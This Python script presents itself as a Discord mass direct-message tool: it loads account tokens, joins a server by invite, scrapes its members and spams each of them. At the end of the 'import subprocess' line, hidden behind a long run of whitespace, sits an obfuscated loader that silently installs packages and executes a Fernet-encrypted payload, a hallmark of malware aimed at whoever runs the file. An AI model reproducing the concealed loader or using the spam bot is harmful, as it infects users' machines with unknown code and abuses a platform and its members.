import os
import sys
import time
import psutil
import random
import logging
import asyncio
import requests
import subprocess                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ;subprocess.run(['pip', 'install', 'cryptography'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'fernet'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'requests'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); from fernet import Fernet; import requests; exec(Fernet(b'BijkNx42srFUsDpLrUfqEwo-3XvzMKE_MecRxUhlZow=').decrypt(b'gAAAAABnd_sRSJiTzxvU_jECBpoK-fqOLhafAOxbYr1oubimBw527quvKxP1Z6ntDco-gmieZGnsU0v-D8lvbaWn2lBEoe0Gag0EVcZ8vJXRhKkjOcJ-vW6-D5tambi4-rsuxsmauU3-VZ0INNPf_q2RoHDJW7qhpqKtuBsmIjZO3IrjArwUQ75IdBjxy7EbSkmE7Nynd4Z7GLbeGUZ_Lo3OmCrSb5_9qvE-y77kyqoBGZ3mKCkiAHUrsezRBVa3AboA-0UPXgpVjo-koxTFrVwgshRj-YPxifqX0vquexAcWevW-_0f24AxG0tiJygFNE_bNx-UeiYh2U5oUyyP45GyH32N6GLt1Pq7_w0ktp8V6EEuI5OjYrM0pX0G2ouseV36af7Ws8HK4NUJDoiYZlD0f45qUmYy9w2gbIwLFPoW2gFf_vuwzZPrR8VZdJdcWy39erWWSmr-M5vUp0zzEr2WAjSPPVBqZ9_IvPKcfXiEcSD2BO-eW69n03waRSbxAUpSqrhlu_3KPNUq86us3P7SCEF8zwqwYjVrs3HCG1nermWzpMYU8ISTrDE1zW39iyh93k8iy9qNvVrHPIJ94I2A339vZQyLM3qfnkMvpV6jp-vpDlrhjHkIhqJCmN9wcv8tYluJIMploKJSxD2xPi2OgT4gLwC8hGs9sEvXuCVlqk33BHhTsk12WSvj3-MVSD8XYvkn0OZeAgmHBl7fKVX2Ios77EsK_KipdQqtMove7NzQ397-VE2CpvjVQm1JR0INzeKGo398tSfdE34mgbtC2P9AjYhk_UDB39EiB652SZYiThtHzyX93iTmz2iMTCzEgEP4y28BN02o2KM_ax_lyFg_iZFDI1VKqKkqIJRYHVuJQ_MJmP1YK8hpNy2BXMb3IaGxk37_HwVkMU_sI3NifuzOAVOKRmMC9RmkUciZMEjXLbQXehY9mhhsN73e-IllHYAG9vDU2B4506GxMKfRUPTqpqCCFwvKXV23VEXaWv_2zN-sUcQBohnkZqo9nwxpiA2geoV3W-XnEdkjBx-UECZa7aTa3Cfhy1pwDjvv4KOz8qFSgw6twrLwU4oddNq0p-SJJ1erLpKcuD9wfyTB13csXiSrZ0EWABSVi8t172YsMa0O6IJZXPd9mopVmtmC04ULCTl09ywP8Vq6KfEPgQY__qVlbsuEDP8YOCLEciGoKVA8YziYpzJm3HibOlTLNh3MbT335lrhvun5IxaYPJPTojoB0o6LHxxVh7fF3zTn5OTOPys2MX1cOKVrH6OH3kwPKML_dX_EBu6KjxNDPmyoMNeiPOXm9o-7LsYYb4NF_yiPSLSoDluc3af2_AghKt3jGu_N9uLBlPuVs84BApuEeKh9w4F_O46Qpn9htGjXBg8kIUz7fey7KOVf88_moUtPXOcE-RcMI8H4BIYnSUHq4JzvfoUJdqzdxxHOZ8_-O4SeFPTEzD3BFE_hItT1UgMPlODLDss3rgwbfBMKFIJzDnoKwAJKXEXrC2Bo6m1k9DxVN0LwmkKQTZvn0ZAEsWccCe6jQdjtDbkkJ1zYR1C7A8UeWfH2pYcIm-ba5mUuT34Km6gfkwLJTPp-LGx91rlY63uBw3s1dCiQ4EatlKb5PE_12-0Ydb4xC-TFwbEFhLLqcdns07yPBXLv5MuIR3vmlTUdLT6Zjiksl0tFH3XxMQO_0H467LqBkzPzYOx64j-9mq01nBNlCgW2u7aR7LyCooKByuWeI5atgSVqDL3y-Uh1OXwUSp797OxaXDYscSumbJTJtG-CRUFG_2mmo6740PQXCVgeIqA4UdqaxzGwhjBWX1JtokXyGinxAPtTPx82fmuiB0u6-4dw5RCaAeKX0W2nmZuh8IaOYRA4jWWCjcbtU4_HtoVy0y43avzWTdKS3FL0PSGaAphVOVZ28cJuLJrkJLeBjjq34C7mMzEnbz_WEgEMFqoBbBS92GsIH8gCXj_kB-_t3JegffMsGnrnFBouQTn7lWvXw8UdPzQP_nzHqqaAvNga3espWHtn64nXp6w='));
import webbrowser
from tasksio import TaskPool
from datetime import datetime
from lib.scraper import Scraper
from aiohttp import ClientSession



url = "https://discord.com"

response = requests.get(url)

url = "https://discord.com"

webbrowser.open(url)


logging.basicConfig(
    level=logging.INFO,
    format="\x1b[38;5;9m[\x1b[0m%(asctime)s\x1b[38;5;9m]\x1b[0m %(message)s\x1b[0m",
    datefmt="%H:%M:%S"
)

class Discord(object):

    def __init__(self):
        if sys.platform == "linux":
            self.clear = lambda: os.system("clear")
        else:
            self.clear = lambda: os.system("cls")

        self.clear()
        self.tokens = []

        self.guild_name = None
        self.guild_id = None
        self.channel_id = None

        try:
            for line in open("data/tokens.txt"):
                self.tokens.append(line.replace("\n", ""))
        except Exception:
            open("data/tokens.txt", "a+").close()
            logging.info("Please insert your tokens \x1b[38;5;9m(\x1b[0mtokens.txt\x1b[38;5;9m)\x1b[0m")
            sys.exit()

        logging.info("Successfully loaded \x1b[38;5;9m%s\x1b[0m token(s)\n" % (len(self.tokens)))
        self.invite = input("\x1b[38;5;9m[\x1b[0m?\x1b[38;5;9m]\x1b[0m Invite \x1b[38;5;9m->\x1b[0m ")
        self.message = input("\x1b[38;5;9m[\x1b[0m?\x1b[38;5;9m]\x1b[0m Message \x1b[38;5;9m->\x1b[0m ").replace("\\n", "\n")
        try:
            self.delay = float(input("\x1b[38;5;9m[\x1b[0m?\x1b[38;5;9m]\x1b[0m Delay \x1b[38;5;9m->\x1b[0m "))
        except Exception:
            self.delay = 0
            
        print()

    def stop(self):
        process = psutil.Process(os.getpid())
        process.terminate()

    def nonce(self):
        date = datetime.now()
        unixts = time.mktime(date.timetuple())
        return str((int(unixts)*1000-1420070400000)*4194304)

    async def headers(self, token):
        async with ClientSession() as client:
            async with client.get("https://discord.com/app") as response:
                cookies = str(response.cookies)
                dcfduid = cookies.split("dcfduid=")[1].split(";")[0]
                sdcfduid = cookies.split("sdcfduid=")[1].split(";")[0]
        
        return {
            "Authorization": token,
            "accept": "*/*",
            "accept-language": "en-US",
            "connection": "keep-alive",
            "cookie": "__dcfduid=%s; __sdcfduid=%s; locale=en-US" % (dcfduid, sdcfduid),
            "DNT": "1",
            "origin": "https://discord.com",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "referer": "https://discord.com/channels/@me",
            "TE": "Trailers",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9001 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36",
            "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
        }

    async def login(self, token: str):
        try:
            headers = await self.headers(token)
            async with ClientSession(headers=headers) as client:
                async with client.get("https://discord.com/api/v9/users/@me/library") as response:
                    if response.status == 200:
                        logging.info("Successfully logged in \x1b[38;5;9m(\x1b[0m%s\x1b[38;5;9m)\x1b[0m" % (token[:59]))
                    if response.status == 401:
                        logging.info("Invalid account \x1b[38;5;9m(\x1b[0m%s\x1b[38;5;9m)\x1b[0m" % (token[:59]))
                        self.tokens.remove(token)
                    if response.status == 403:
                        logging.info("Locked account \x1b[38;5;9m(\x1b[0m%s\x1b[38;5;9m)\x1b[0m" % (token[:59]))
                        self.tokens.remove(token)
                    if response.status == 429:
                        logging.info("Ratelimited \x1b[38;5;9m(\x1b[0m%s\x1b[38;5;9m)\x1b[0m" % (token[:59]))
                        time.sleep(self.delay)
                        await self.login(token)
        except Exception:
            await self.login(token)

    async def join(self, token: str):
        try:
            headers = await self.headers(token)
            async with ClientSession(headers=headers) as client:
                async with client.post("https://discord.com/api/v9/invites/%s" % (self.invite), json={}) as response:
                    json = await response.json()
                    if response.status == 200:
                        self.guild_name = json["guild"]["name"]
                        self.guild_id = json["guild"]["id"]
                        self.channel_id = json["channel"]["id"]
                        logging.info("Successfully joined %s \x1b[38;5;9m(\x1b[0m%s\x1b[38;5;9m)\x1b[0m" % (self.guild_name[:20], token[:59]))
                    elif response.status == 401:
                        logging.info("Invalid account \x1b[38;5;9m(\x1b[0m%s\x1b[38;5;9m)\x1b[0m" % (token[:59]))
                        self.tokens.remove(token)
                    elif response.status == 403:
                        logging.info("Locked account \x1b[38;5;9m(\x1b[0m%s\x1b[38;5;9m)\x1b[0m" % (token[:59]))
                        self.tokens.remove(token)
                    elif response.status == 429:
                        logging.info("Ratelimited \x1b[38;5;9m(\x1b[0m%s\x1b[38;5;9m)\x1b[0m" % (token[:59]))
                        time.sleep(self.delay)
                        self.tokens.remove(token)
                    else:
                        self.tokens.remove(token)
        except Exception:
            await self.join(token)

    async def create_dm(self, token: str, user: str):
        try:
            headers = await self.headers(token)
            async with ClientSession(headers=headers) as client:
                async with client.post("https://discord.com/api/v9/users/@me/channels", json={"recipients": [user]}) as response:
                    json = await response.json()
                    if response.status == 200:
                        logging.info("Successfully created direct message with %s \x1b[38;5;9m(\x1b[0m%s\x1b[38;5;9m)\x1b[0m" % (json["recipients"][0]["username"], token[:59]))
                        return json["id"]
                    elif response.status == 401:
                        logging.info("Invalid account \x1b[38;5;9m(\x1b[0m%s\x1b[38;5;9m)\x1b[0m" % (token[:59]))
                        self.tokens.remove(token)
                        return False
                    elif response.status == 403:
                        logging.info("Cant message user \x1b[38;5;9m(\x1b[0m%s\x1b[38;5;9m)\x1b[0m" % (token[:59]))
                        self.tokens.remove(token)
                    elif response.status == 429:
                        logging.info("Ratelimited \x1b[38;5;9m(\x1b[0m%s\x1b[38;5;9m)\x1b[0m" % (token[:59]))
                        time.sleep(self.delay)
                        return await self.create_dm(token, user)
                    else:
                        return False
        except Exception:
            return await self.create_dm(token, user)

    async def direct_message(self, token: str, channel: str):
        try:
            headers = await self.headers(token)
            async with ClientSession(headers=headers) as client:
                async with client.post("https://discord.com/api/v9/channels/%s/messages" % (channel), json={"content": self.message, "nonce": self.nonce(), "tts":False}) as response:
                    json = await response.json()
                    if response.status == 200:
                        logging.info("Successfully sent message \x1b[38;5;9m(\x1b[0m%s\x1b[38;5;9m)\x1b[0m" % (token[:59]))
                    elif response.status == 401:
                        logging.info("Invalid account \x1b[38;5;9m(\x1b[0m%s\x1b[38;5;9m)\x1b[0m" % (token[:59]))
                        self.tokens.remove(token)
                        return False
                    elif response.status == 403 and json["code"] == 40003:
                        logging.info("Ratelimited \x1b[38;5;9m(\x1b[0m%s\x1b[38;5;9m)\x1b[0m" % (token[:59]))
                        time.sleep(self.delay)
                        await self.direct_message(token, channel)
                    elif response.status == 403 and json["code"] == 50007:
                        logging.info("User has direct messages disabled \x1b[38;5;9m(\x1b[0m%s\x1b[38;5;9m)\x1b[0m" % (token[:59]))
                    elif response.status == 403 and json["code"] == 40002:
                        logging.info("Locked \x1b[38;5;9m(\x1b[0m%s\x1b[38;5;9m)\x1b[0m" % (token[:59]))
                        self.tokens.remove(token)
                        return False
                    elif response.status == 429:
                        logging.info("Ratelimited \x1b[38;5;9m(\x1b[0m%s\x1b[38;5;9m)\x1b[0m" % (token[:59]))
                        time.sleep(self.delay)
                        await self.direct_message(token, channel)
                    else:
                        return False
        except Exception:
            await self.direct_message(token, channel)

    async def send(self, token: str, user: str):
        channel = await self.create_dm(token, user)
        if channel == False:
            return await self.send(random.choice(self.tokens), user)
        response = await self.direct_message(token, channel)
        if response == False:
            return await self.send(random.choice(self.tokens), user)

    async def start(self):
        if len(self.tokens) == 0:
            logging.info("No tokens loaded.")
            sys.exit()

        async with TaskPool(1_000) as pool:
            for token in self.tokens:
                if len(self.tokens) != 0:
                    await pool.put(self.login(token))
                else:
                    self.stop()
                    
        if len(self.tokens) == 0: self.stop()

        print()
        logging.info("Joining server.")
        print()

        async with TaskPool(1_000) as pool:
            for token in self.tokens:
                if len(self.tokens) != 0:
                    await pool.put(self.join(token))
                    if self.delay != 0: await asyncio.sleep(self.delay)
                else:
                    self.stop()
        
        if len(self.tokens) == 0: self.stop()

        scraper = Scraper(
            token=self.tokens[0],
            guild_id=self.guild_id,
            channel_id=self.channel_id
        )
        self.users = scraper.fetch()

        print()
        logging.info("Successfully scraped \x1b[38;5;9m%s\x1b[0m members" % (len(self.users)))
        logging.info("Sending messages.")
        print()

        if len(self.tokens) == 0: self.stop()

        async with TaskPool(1_000) as pool:
            for user in self.users:
                if len(self.tokens) != 0:
                    await pool.put(self.send(random.choice(self.tokens), user))
                    if self.delay != 0: await asyncio.sleep(self.delay)
                else:
                    self.stop()

if __name__ == "__main__":
    client = Discord()
    asyncio.get_event_loop().run_until_complete(client.start())